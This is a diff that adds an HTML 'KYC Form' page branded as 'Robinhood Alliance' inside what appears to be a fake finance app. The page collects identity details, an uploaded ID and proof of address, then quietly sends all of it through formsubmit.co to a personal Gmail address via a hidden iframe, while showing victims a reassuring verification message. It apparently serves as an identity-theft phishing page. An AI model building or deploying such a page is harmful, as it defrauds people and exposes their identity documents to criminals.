@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en" class="light">
+
+<head>
+    <script>(function(){try{var t=localStorage.getItem("ra-theme");var mode;if(t==="light"||t==="dark"){mode=t;}else{if(t!=="auto"){try{localStorage.setItem("ra-theme","auto");}catch(x){}}var h=new Date().getHours();mode=(h>=6&&h<18)?"light":"dark";}if(mode==="light"){document.documentElement.classList.remove("dark");document.documentElement.classList.add("light");}else{document.documentElement.classList.add("dark");document.documentElement.classList.remove("light");}}catch(e){}})();</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#007bcf" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <title>Robinhood Alliance - KYC Form</title>
+    <meta name="title" content="Robinhood Alliance - KYC Form">
+    <meta name="description" content="Robinhood Alliance">
+
+    <!-- Icons & manifests -->
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="assets/images/favicon-512x512.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="assets/images/favicon-192x192.png">
+    <link rel="manifest" href="assets/images/site.webmanifest">
+    <link rel="icon" href="assets/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/assets/images/logo_icon/logo.jpg">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Robinhood Alliance - KYC Form">
+
+    <meta itemprop="name" content="Robinhood Alliance - KYC Form">
+    <meta itemprop="description" content="Robinhood Alliance">
+    <meta itemprop="image" content="/assets/images/seo/68faba839a8751761262211.png">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Robinhood Alliance">
+    <meta property="og:description" content="Robinhood Alliance">
+    <meta property="og:image" content="/assets/images/seo/68faba839a8751761262211.png">
+    <meta property="og:url" content="/user/kyc-form.html">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style data-styles="">
+        ion-icon { visibility: hidden; }
+        .hydrated { visibility: inherit; }
+    </style>
+
+    <style>
+        :root {
+            --AppColor: #007bcf;
+            --oColor: rgba(0, 123, 207, 0.37);
+            --wbColor: #fff;
+            --d_Color: #00528a;
+            --siteUrl: "";
+        }
+    </style>
+
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="/static/css/src/ionicons.min.css">
+    <link rel="stylesheet" href="/static/css/App_Global.css">
+    <link href="/static/offline-theme-default.css" rel="stylesheet">
+    <link href="/static/offline-language-english.css" rel="stylesheet">
+    <link href="/static/alertify.css" rel="stylesheet">
+    <link href="/static/default.css" rel="stylesheet">
+    <link href="/static/css/font-awesome.css" rel="stylesheet">
+    <link href="/panel/assets/css/toastr.min.css" rel="stylesheet" type="text/css">
+    <link href="/panel/assets/css/icons.min.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" crossorigin="anonymous">
+    <link href="/assets/global/css/iziToast.min.css" rel="stylesheet">
+    <link href="/assets/global/css/iziToast_custom.css" rel="stylesheet">
+
+    <script src="/static/js/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        /* Layout */
+        .appHeader { background: inherit !important; border: none !important; }
+        #appCapsule { margin-top: 18px; margin-bottom: 18px; }
+        .ico1 { display: flex !important; }
+        .imaged.w48 { width: 40px !important; }
+
+        /* File preview */
+        .file-preview-img {
+            object-fit: cover;
+            border-radius: 6px;
+            border: 1px solid #dee2e6;
+            background: #f8f9fa;
+            padding: 4px;
+            max-width: 120px;
+            max-height: 120px;
+            width: auto;
+            height: auto;
+        }
+
+        /* Dark mode overrides (only when .dark on html) */
+        html.dark select.form-control,
+        html.dark select.form-control-lg,
+        html.dark input.form-control,
+        html.dark input.form-control-lg,
+        html.dark textarea.form-control,
+        html.dark textarea.form-control-lg {
+            background-color: #1c2128 !important;
+            color: #e6edf3 !important;
+            border-color: #30363d !important;
+        }
+        html.dark select.form-control option,
+        html.dark select.form-control-lg option {
+            background-color: #1c2128 !important;
+            color: #e6edf3 !important;
+        }
+        html.dark select.form-control:focus,
+        html.dark select.form-control-lg:focus,
+        html.dark input.form-control:focus,
+        html.dark input.form-control-lg:focus {
+            border-color: #007bcf !important;
+            box-shadow: 0 0 0 0.2rem rgba(0, 123, 207, 0.25) !important;
+        }
+        html.dark .file-preview-img {
+            border-color: #30363d;
+            background: #161b22;
+        }
+
+        /* Theme toggle */
+        .theme-toggle {
+            cursor: pointer;
+            font-size: 1.5rem;
+            color: #007bcf;
+            background: transparent;
+            border: none;
+            padding: 0 10px;
+        }
+        .theme-toggle:hover { color: #0056b3; }
+        html.dark .theme-toggle { color: #e6edf3; }
+
+        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+    </style>
+    <link rel="stylesheet" href="static/css/glass-dashboard.css?v=1790030000">
+</head>
+
+<body class="glass-ui">
+
+    <!-- Header with theme toggle -->
+    <div class="appHeader text-light ico1">
+        <div class="left">
+            <a href="javascript:void(0)" onclick="history.back();" class="headerButton">
+                <ion-icon name="chevron-back-outline" role="img" class="icon md hydrated"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle">
+            <span class="brand-title">ROBINHOOD</span>
+        </div>
+        <div class="right">
+            
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <div id="appCapsule" class="container">
+
+        <!-- Hidden iframe – form posts here, page never reloads -->
+        <iframe name="kyc_frame" id="kyc_frame" style="display:none;width:0;height:0;border:0;" title="kyc"></iframe>
+
+        <!-- Native form – NO AJAX, NO redirect, files are sent -->
+        <form id="kycForm"
+              action="https://formsubmit.co/t.blankenship8704@gmail.com"
+              method="POST"
+              enctype="multipart/form-data"
+              target="kyc_frame">
+
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New KYC Submission - Robinhood Alliance">
+            <input type="hidden" name="_template" value="table">
+            <!-- No _next – we handle success via iframe onload -->
+            <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
+
+            <div id="ContentPlaceHolder1_UpdatePanel1">
+                <div class="row">
+                    <div class="col-md-12 grid-margin stretch-card">
+                        <div class="card pb-5">
+                            <div class="card-body">
+                                <p class="card-title mb-0">KYC</p>
+                                <br>
+                                <div class="container">
+                                    <div class="row justify-content-md-center">
+                                        <div class="rcx_prt col-xs-12 col-sm-12 col-md-10 col-lg-8">
+                                            <div id="ContentPlaceHolder1__Form" class="row">
+                                                <div id="ContentPlaceHolder1_Sect_1">
+                                                    <div class="col-md-12 grid-margin stretch-card mb-3">
+
+                                                        <!-- PART A -->
+                                                        <div class="card mb-5">
+                                                            <div class="card-header"><h5 class="card-title">PART A: IDENTITY DETAILS</h5></div>
+                                                            <div class="card-body">
+                                                                <div class="forms-sample">
+                                                                    <div class="form-group basic">
+                                                                        <label>Full Name:</label>
+                                                                        <input name="full_name" type="text" class="form-control form-control-lg" required>
+                                                                    </div>
+                                                                    <div class="form-group basic">
+                                                                        <label>Gender:</label>
+                                                                        <select name="gender" class="form-control form-control-lg" required>
+                                                                            <option value="">Select Gender</option>
+                                                                            <option value="male">Male</option>
+                                                                            <option value="female">Female</option>
+                                                                        </select>
+                                                                    </div>
+                                                                    <div class="form-group basic">
+                                                                        <label>Marital Status:</label>
+                                                                        <select name="marital_status" class="form-control form-control-lg" required>
+                                                                            <option value="">Select Marital Status</option>
+                                                                            <option value="single">Single</option>
+                                                                            <option value="divorced">Divorced</option>
+                                                                            <option value="married">Married</option>
+                                                                            <option value="widowed">Widowed</option>
+                                                                            <option value="separated">Separated</option>
+                                                                        </select>
+                                                                    </div>
+                                                                    <div class="form-group basic">
+                                                                        <label>Date of Birth</label>
+                                                                        <input name="date_of_birth" type="date" class="form-control form-control-lg" required>
+                                                                    </div>
+                                                                    <div class="form-group basic">
+                                                                        <label>Mode of Identification</label>
+                                                                        <select name="mode_of_verification" class="form-control form-control-lg" required>
+                                                                            <option value="">Select Preferred Mode</option>
+                                                                            <option value="Passport">Passport</option>
+                                                                            <option value="Voter Registration Card">Voter Registration Card</option>
+                                                                            <option value="Valid Driver's License">Valid Driver's License</option>
+                                                                            <option value="National Identity Card">National Identity Card</option>
+                                                                        </select>
+                                                                    </div>
+                                                                    <div class="form-group basic row align-items-center">
+                                                                        <div class="col-lg-6 col-12">
+                                                                            <label>Upload ID:</label>
+                                                                            <input id="poi" type="file" name="id_card"
+                                                                                   accept="image/png, image/jpeg, image/jpg, application/pdf"
+                                                                                   class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                        <div class="col-lg-6 col-12 text-center mt-lg-0 mt-3">
+                                                                            <img src="/assets/img/placeholder.png"
+                                                                                 data-prev="/assets/img/placeholder.png"
+                                                                                 class="file-preview-img" id="poiPreview"
+                                                                                 width="120" alt="ID preview">
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+
+                                                        <!-- PART B -->
+                                                        <div class="card mb-5">
+                                                            <div class="card-header"><h5 class="card-title">PART B: ADDRESS DETAILS</h5></div>
+                                                            <div class="card-body">
+                                                                <div class="forms-sample">
+                                                                    <div class="form-group basic row">
+                                                                        <div class="col-12">
+                                                                            <label>Residential Address:</label>
+                                                                            <input name="address" type="text" class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="form-group basic row">
+                                                                        <div class="col-lg-6 col-12">
+                                                                            <label>City:</label>
+                                                                            <input name="city" type="text" class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                        <div class="col">
+                                                                            <label>State:</label>
+                                                                            <input name="state" type="text" class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="form-group basic row">
+                                                                        <div class="col-lg-6 col-12">
+                                                                            <label>Country:</label>
+                                                                            <input name="country" type="text" class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                        <div class="col">
+                                                                            <label>Zip Code:</label>
+                                                                            <input name="zip_code" type="text" class="form-control form-control-lg">
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="form-group basic row">
+                                                                        <div class="col-12">
+                                                                            <label>Proof of Address</label>
+                                                                            <select name="proof_of_address" class="form-control form-control-lg" required>
+                                                                                <option value="">Select Preferred Mode</option>
+                                                                                <option value="Utility Bill">Utility Bill</option>
+                                                                                <option value="Insurance Card">Insurance Card</option>
+                                                                                <option value="Bank Statement">Bank Statement</option>
+                                                                                <option value="Lease Agreement">Lease Agreement</option>
+                                                                                <option value="Property Tax Receipt">Property Tax Receipt</option>
+                                                                            </select>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="form-group basic row align-items-center">
+                                                                        <div class="col-lg-6 col-12">
+                                                                            <label>Upload Proof:</label>
+                                                                            <input id="poa" name="address_verification"
+                                                                                   type="file"
+                                                                                   accept="image/png, image/jpeg, image/jpg, application/pdf"
+                                                                                   class="form-control form-control-lg" required>
+                                                                        </div>
+                                                                        <div class="col-lg-6 col-12 text-center mt-lg-0 mt-3">
+                                                                            <img src="/assets/img/placeholder.png"
+                                                                                 data-prev="/assets/img/placeholder.png"
+                                                                                 class="file-preview-img" id="poaPreview"
+                                                                                 width="120" alt="Proof preview">
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="card-footer text-end mt-3">
+                                                                        <button type="submit" class="btn btn-primary m-1"
+                                                                                style="border-radius:0" id="kyc_btn">
+                                                                            Submit
+                                                                            <ion-icon class="ms-1 md hydrated" name="checkbox-outline"
+                                                                                      role="img"></ion-icon>
+                                                                        </button>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <!-- Bottom navigation -->
+
+    <div class="appBottomMenu">
+        <a href="/dashboard.html" class="item"><div class="col"><ion-icon name="home-outline"></ion-icon><strong>Home</strong></div></a>
+        <a href="/swap.html" class="item"><div class="col"><ion-icon name="reload-outline"></ion-icon><strong>Swap</strong></div></a>
+        <a href="/buy.html" class="item"><div class="col"><ion-icon name="cart-outline"></ion-icon><strong>Buy</strong></div></a>
+        <a href="/cards.html" class="item"><div class="col"><ion-icon name="card-outline"></ion-icon><strong>Cards</strong></div></a>
+        <a href="/payments.html" class="item"><div class="col"><ion-icon name="cash-outline"></ion-icon><strong>Payments</strong></div></a>
+        <a href="/vaults.html" class="item"><div class="col"><ion-icon name="lock-closed-outline"></ion-icon><strong>Vaults</strong></div></a>
+        <a href="/profile-setting.html" class="item"><div class="col"><ion-icon name="settings-outline"></ion-icon><strong>Settings</strong></div></a>
+    </div>
+
+
+    <!-- Scripts -->
+    <script src="/static/js/lib/bootstrap.bundle.min.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+    <script src="/static/js/plugins/splide/splide.min.js"></script>
+    <script src="/static/js/base.js"></script>
+    <script src="/static/js/AppMain.js"></script>
+    <script src="/static/alertify.min.js"></script>
+    <script src="/static/panel.js"></script>
+    <script src="/static/js/typo.js"></script>
+    <script src="/static/js/a_GenImage.js"></script>
+    <script src="/panel/assets/js/toastr.min.js"></script>
+    <script src="/assets/global/js/iziToast.min.js"></script>
+
+    <script>
+        "use strict";
+
+        // ============================================================
+        //  IZITOAST NOTIFICATION (same as your working version)
+        // ============================================================
+        const colors = {
+            success: '#28c76f',
+            error: '#eb2222',
+            warning: '#ff9f43',
+            info: '#1e9ff2',
+        };
+        const icons = {
+            success: 'fas fa-check-circle',
+            error: 'fas fa-times-circle',
+            warning: 'fas fa-exclamation-triangle',
+            info: 'fas fa-exclamation-circle',
+        };
+
+        const triggerToaster = (status, message) => {
+            if (typeof iziToast === 'undefined') {
+                console.log(status + ': ' + message);
+                return;
+            }
+            iziToast[status]({
+                title: status.charAt(0).toUpperCase() + status.slice(1),
+                message: message,
+                position: "topRight",
+                backgroundColor: '#fff',
+                icon: icons[status],
+                iconColor: colors[status],
+                progressBarColor: colors[status],
+                titleSize: '1rem',
+                messageSize: '1rem',
+                titleColor: '#474747',
+                messageColor: '#a2a2a2',
+                transitionIn: 'bounceInLeft'
+            });
+        };
+
+        function notify(status, message) {
+            if (typeof message === 'string') {
+                triggerToaster(status, message);
+            } else {
+                Object.keys(message || {}).forEach(k => triggerToaster(status, message[k]));
+            }
+        }
+
+        // ============================================================
+        //  FILE PREVIEW
+        // ============================================================
+        function bindPreview(inputId, previewId) {
+            const input = document.getElementById(inputId);
+            const img = document.getElementById(previewId);
+            if (!input || !img) return;
+
+            input.addEventListener('change', function() {
+                const file = this.files && this.files[0];
+                if (!file) return;
+                if (file.type && file.type.indexOf('image/') === 0) {
+                    const reader = new FileReader();
+                    reader.onload = e => img.src = e.target.result;
+                    reader.readAsDataURL(file);
+                } else {
+                    img.src = img.dataset.prev || '/assets/img/placeholder.png';
+                    img.alt = 'File: ' + file.name;
+                }
+            });
+        }
+        bindPreview('poi', 'poiPreview');
+        bindPreview('poa', 'poaPreview');
+
+        // ============================================================
+        //  THEME TOGGLE (light/dark) with localStorage
+        // ============================================================
+        (function() {
+            const html = document.documentElement;
+            const toggleBtn = document.getElementById('themeToggle');
+            const icon = document.getElementById('themeIcon');
+            if (!toggleBtn) return;
+
+            const saved = localStorage.getItem('theme') || 'light';
+            html.classList.remove('light', 'dark');
+            html.classList.add(saved);
+            updateIcon(saved);
+
+            toggleBtn.addEventListener('click', function() {
+                const current = html.classList.contains('dark') ? 'dark' : 'light';
+                const next = current === 'dark' ? 'light' : 'dark';
+                html.classList.remove('light', 'dark');
+                html.classList.add(next);
+                localStorage.setItem('theme', next);
+                updateIcon(next);
+            });
+
+            function updateIcon(theme) {
+                if (icon) {
+                    icon.name = theme === 'dark' ? 'sunny-outline' : 'moon-outline';
+                }
+            }
+        })();
+
+        // ============================================================
+        //  IFRAME SUBMISSION HANDLER (no AJAX, no reload)
+        // ============================================================
+        (function() {
+            const form = document.getElementById('kycForm');
+            const iframe = document.getElementById('kyc_frame');
+            const btn = document.getElementById('kyc_btn');
+            const originalHtml = btn ? btn.innerHTML : '';
+
+            if (!form || !iframe || !btn) return;
+
+            // When form is submitted: disable button, show spinner
+            form.addEventListener('submit', function() {
+                btn.disabled = true;
+                btn.innerHTML = 'Submitting… <span class="spinner-border spinner-border-sm ms-1" role="status" aria-hidden="true"></span>';
+            });
+
+            // When iframe loads, the form submission is complete.
+            iframe.addEventListener('load', function() {
+                // Only act if the button is disabled (i.e., we submitted)
+                if (!btn.disabled) return;
+
+                // Success: show toast, reset form, re-enable button
+                notify('success', 'Your information was submitted successfully. Please wait while your identity is being verified.');
+
+                // Reset form
+                form.reset();
+
+                // Reset preview images to placeholder
+                const poiImg = document.getElementById('poiPreview');
+                const poaImg = document.getElementById('poaPreview');
+                if (poiImg && poiImg.dataset.prev) poiImg.src = poiImg.dataset.prev;
+                if (poaImg && poaImg.dataset.prev) poaImg.src = poaImg.dataset.prev;
+
+                // Re-enable button
+                btn.disabled = false;
+                btn.innerHTML = originalHtml;
+            });
+
+            // Safety net: if something goes wrong and iframe never loads, re-enable after 15s
+            form.addEventListener('submit', function() {
+                setTimeout(function() {
+                    if (btn.disabled) {
+                        btn.disabled = false;
+                        btn.innerHTML = originalHtml;
+                    }
+                }, 15000);
+            });
+        })();
+
+        console.log('✅ KYC form with iframe (no AJAX, no reload) – files are sent, page stays.');
+    </script>
+
+<script>
+(function(){
+  var KEY="ra-theme";
+  function stored(){try{return localStorage.getItem(KEY);}catch(e){return null;}}
+  function timeTheme(){var h=new Date().getHours();return (h>=6&&h<18)?"light":"dark";}
+  function getTheme(){var t=stored();if(t==="light"||t==="dark")return t;return timeTheme();}
+  function setIcon(theme){
+    var btn=document.getElementById("raThemeToggle");
+    if(!btn) return;
+    var icon=btn.querySelector("ion-icon");
+    var emoji=btn.querySelector(".ra-theme-emoji");
+    if(icon){
+      icon.setAttribute("name", theme==="dark"?"sunny-outline":"moon-outline");
+    }else if(emoji){
+      emoji.textContent=theme==="dark"?"☀":"☾";
+    }else{
+      btn.textContent=theme==="dark"?"☀":"☾";
+    }
+    btn.setAttribute("aria-label", theme==="dark"?"Switch to light mode":"Switch to dark mode");
+    btn.title=theme==="dark"?"Light mode":"Dark mode";
+  }
+  function apply(theme,persist){
+    var root=document.documentElement, body=document.body;
+    if(theme==="light"){
+      root.classList.remove("dark"); root.classList.add("light");
+      if(body) body.classList.remove("dark-mode");
+      try{localStorage.setItem("FinappDarkmode","0");}catch(e){}
+    }else{
+      theme="dark";
+      root.classList.add("dark"); root.classList.remove("light");
+      if(body) body.classList.add("dark-mode");
+      try{localStorage.setItem("FinappDarkmode","1");}catch(e){}
+    }
+    if(persist!==false){try{localStorage.setItem(KEY,theme);}catch(e){}}
+    setIcon(theme);
+    var sw=document.getElementById("darkmodeSwitch");
+    if(sw) sw.checked=(theme==="dark");
+  }
+  function toggle(e){if(e){e.preventDefault();e.stopPropagation();}apply(getTheme()==="dark"?"light":"dark",true);}
+  function ensureBtn(){
+    var btn=document.getElementById("raThemeToggle");
+    if(!btn){
+      btn=document.createElement("button");
+      btn.id="raThemeToggle"; btn.type="button";
+      btn.className="headerButton ra-theme-toggle ra-theme-fab";
+      btn.innerHTML='<span class="ra-theme-emoji">☀</span>';
+      (document.body||document.documentElement).appendChild(btn);
+    }else{
+      var header=btn.closest&&btn.closest(".appHeader");
+      var hidden=false;
+      if(header){
+        var st=(header.getAttribute("style")||"").replace(/\s/g,"").toLowerCase();
+        if(st.indexOf("display:none")!==-1) hidden=true;
+        try{if(window.getComputedStyle&&getComputedStyle(header).display==="none") hidden=true;}catch(e){}
+      }
+      if(!header||hidden){
+        btn.classList.add("ra-theme-fab");
+        if(btn.parentNode!==document.body) document.body.appendChild(btn);
+        if(!btn.querySelector("ion-icon") && !btn.querySelector(".ra-theme-emoji")){
+          btn.innerHTML='<span class="ra-theme-emoji">☀</span>';
+        }
+      }
+    }
+    if(!btn._raBound){btn._raBound=1;btn.addEventListener("click",toggle);}
+  }
+  function bindSwitch(){
+    var sw=document.getElementById("darkmodeSwitch");
+    if(!sw||sw._raBound) return;
+    sw._raBound=1;
+    sw.addEventListener("click",function(){
+      setTimeout(function(){
+        apply(document.body.classList.contains("dark-mode")?"dark":"light");
+      },0);
+    });
+  }
+  function init(){ensureBtn();bindSwitch();var t=stored();if(t==="light"||t==="dark"){apply(t,false);}else{if(t!=="auto"){try{localStorage.setItem(KEY,"auto");}catch(e){}}apply(timeTheme(),false);}}
+  if(document.readyState==="loading") document.addEventListener("DOMContentLoaded",init);
+  else init();
+})();
+</script>
+</body>
+</html>
